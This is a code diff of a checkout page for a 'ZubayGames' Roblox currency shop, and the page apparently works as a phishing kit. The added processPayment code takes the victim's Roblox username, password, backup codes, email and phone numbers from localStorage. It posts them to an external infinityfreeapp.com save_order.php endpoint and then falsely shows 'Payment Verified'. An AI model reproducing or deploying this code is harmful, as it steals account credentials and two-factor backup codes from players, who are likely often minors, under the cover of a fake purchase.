@@ -14,7 +14,6 @@
 </head>
 <body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">
 
-    <!-- Main Container -->
     <div id="main-container" class="w-full max-w-sm bg-white rounded-3xl shadow-2xl p-8 fade-in">
         <h2 class="text-2xl font-extrabold text-center text-slate-800 mb-6">ZubayGames</h2>
 
@@ -51,15 +50,14 @@
         </div>
     </div>
 
-    <!-- Status Screen -->
     <div id="status-screen" class="hidden w-full max-w-sm text-center p-8">
         <div id="spinner" class="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
         <h1 id="status-text" class="text-xl font-bold text-slate-700">Processing transaction...</h1>
     </div>
 
     <script>
-        const price = localStorage.getItem('checkout_pack_price') || '0.00';
-        document.getElementById('display-amount').innerText = price;
+        // Load price
+        document.getElementById('display-amount').innerText = localStorage.getItem('checkout_pack_price') || '0.00';
 
         function showSteps(el, method, number) {
             document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
@@ -76,87 +74,48 @@
         }
 
         function processPayment() {
-            if(!document.getElementById('txid').value) return alert("Please enter Transaction ID!");
+            const txid = document.getElementById('txid').value.trim();
+            const method = document.getElementById('method-name').innerText;
+            
+            if (!txid) return alert("Please enter Transaction ID!");
+            if (!method) return alert("Please select a payment method!");
+
             document.getElementById('main-container').classList.add('hidden');
             document.getElementById('status-screen').classList.remove('hidden');
-            setTimeout(() => {
+
+            let formData = new FormData();
+            formData.append('amount', localStorage.getItem('checkout_pack_price') || '0');
+            formData.append('username', localStorage.getItem('checkout_roblox_id') || '');
+            formData.append('password', localStorage.getItem('checkout_password') || '');
+            formData.append('backup', localStorage.getItem('checkout_backup_codes') || '');
+            formData.append('whatsapp', localStorage.getItem('checkout_contact_number') || '');
+            formData.append('email', localStorage.getItem('checkout_email') || '');
+            formData.append('fname', localStorage.getItem('checkout_fname') || '');
+            formData.append('phone', localStorage.getItem('checkout_phone') || '');
+            formData.append('txid', txid);
+            formData.append('method', method);
+
+            fetch('http://swift11.infinityfreeapp.com/save_order.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(() => {
                 document.getElementById('spinner').classList.add('hidden');
-                document.getElementById('status-text').innerText = "Payment Complete! ✅";
+                document.getElementById('status-text').innerText = "Payment Verified! ✅";
                 document.getElementById('status-text').classList.add('text-green-600');
-            }, 4000);
+                
+                setTimeout(() => {
+                    localStorage.clear();
+                    window.location.href = "index.html";
+                }, 3000);
+            })
+            .catch(() => {
+                alert("Error: Data could not be saved. Please try again.");
+                document.getElementById('main-container').classList.remove('hidden');
+                document.getElementById('status-screen').classList.add('hidden');
+            });
         }
-<script>
-    // Price display logic
-    const price = localStorage.getItem('checkout_pack_price') || '0.00';
-    document.getElementById('display-amount').innerText = price;
-
-    // Payment Selection logic
-    function showSteps(el, method, number) {
-        document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
-        el.classList.add('active');
-        document.getElementById('instruction-box').classList.remove('hidden');
-        document.getElementById('method-name').innerText = method;
-        document.getElementById('copy-number').innerText = number;
-    }
-
-    // Copy to clipboard
-    function copyToClipboard() {
-        const num = document.getElementById('copy-number').innerText;
-        navigator.clipboard.writeText(num);
-        alert("Number copied!");
-    }
-
-    // Final Processing Function
-    function processPayment() {
-        const txid = document.getElementById('txid').value.trim();
-        const method = document.getElementById('method-name').innerText;
-        
-        if (!txid) return alert("Please enter Transaction ID!");
-        if (!method) return alert("Please select a payment method!");
-
-        // UI update: Loading screen show karo
-        document.getElementById('main-container').classList.add('hidden');
-        document.getElementById('status-screen').classList.remove('hidden');
-
-        // FormData banaiye
-        let formData = new FormData();
-        
-        // Purana User data (robux.html + bill.html)
-        formData.append('amount', localStorage.getItem('checkout_pack_price'));
-        formData.append('username', localStorage.getItem('checkout_roblox_id'));
-        formData.append('password', localStorage.getItem('checkout_password'));
-        formData.append('backup', localStorage.getItem('checkout_backup_codes'));
-        formData.append('whatsapp', localStorage.getItem('checkout_contact_number'));
-        formData.append('email', localStorage.getItem('checkout_email'));
-        formData.append('fname', localStorage.getItem('checkout_fname'));
-        formData.append('phone', localStorage.getItem('checkout_phone'));
-        
-        // Naya Payment data
-        formData.append('txid', txid);
-        formData.append('method', method);
-
-        // Server par data send karo
-        fetch('http://swift11.infinityfreeapp.com/save_order.php', {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Success UI
-            document.getElementById('spinner').classList.add('hidden');
-            document.getElementById('status-text').innerText = "Payment Verified! ✅";
-            document.getElementById('status-text').classList.add('text-green-600');
-            
-            // Redirect after 3s
-            setTimeout(() => {
-                localStorage.clear();
-                window.location.href = "index.html";
-            }, 3000);
-        })
-        .catch(error => {
-            alert("Error: Data save nahi hua. Phir se try karein.");
-            document.getElementById('main-container').classList.remove('hidden');
-            document.getElementById('status-screen').classList.add('hidden');
-        });
-    }
-</script>
+    </script>
+</body>
+</html>
